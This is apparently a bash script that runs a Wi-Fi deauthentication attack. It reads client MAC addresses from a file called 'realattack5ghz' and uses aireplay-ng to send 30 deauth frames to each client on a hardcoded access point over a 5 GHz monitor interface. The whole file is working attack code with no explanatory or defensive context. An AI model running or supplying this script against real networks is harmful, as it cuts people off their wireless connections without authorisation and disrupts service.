#!/bin/bash

BSSID5="E8:65:D4:60:94:45"
GHZ5=wlp0s19f2u5mon



for deauth in $(cat realattack5ghz); do
if [[ $deauth = "< | HWaddress" ]]; then
	echo ""
else
sudo aireplay-ng -D --deauth 30 -a $BSSID5 -c $deauth $GHZ5
fi
done

